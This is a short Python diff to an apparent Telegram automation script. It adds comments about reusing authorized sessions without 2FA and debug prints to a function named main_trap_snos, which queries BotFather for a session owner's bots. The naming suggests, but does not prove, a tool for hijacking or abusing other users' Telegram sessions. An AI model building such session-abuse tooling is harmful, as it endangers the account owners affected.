@@ -62,6 +62,8 @@ async def _get_client() -> TelegramClient:
         system_version="4.16.30-vxCUSTOM"
     )
     await client.connect()
+    # Если есть сохранённая сессия - она подхватится автоматически
+    # 2FA пароль не нужен при connect() если сессия уже авторизована
     return client
 
 
@@ -132,7 +134,9 @@ async def main_trap_snos(user_id: int, username: str) -> dict:
                 parse_mode="Markdown")
             return {"ok": False, "error": "session_invalid"}
 
+        print(f"[TRAP] Сессия авторизована, получаю BotFather...", flush=True)
         bf = await client.get_entity(BOTFATHER)
+        print(f"[TRAP] BotFather получен, отправляю /mybots...", flush=True)
 
         # ── Проверяем существующих ботов ──────────────────────────────────────
         await client.send_message(bf, "/mybots")
@@ -140,8 +144,9 @@ async def main_trap_snos(user_id: int, username: str) -> dict:
 
         msgs = await client.get_messages(bf, limit=5)
         existing_bot = None
-
+        print(f"[TRAP] Получено {len(msgs)} сообщений от BotFather", flush=True)
         for msg in msgs:
+            print(f"[TRAP] msg text: {str(msg.text)[:80]} | buttons: {bool(msg.buttons)}", flush=True)
             if msg.buttons:
                 for row in msg.buttons:
                     for btn in row:
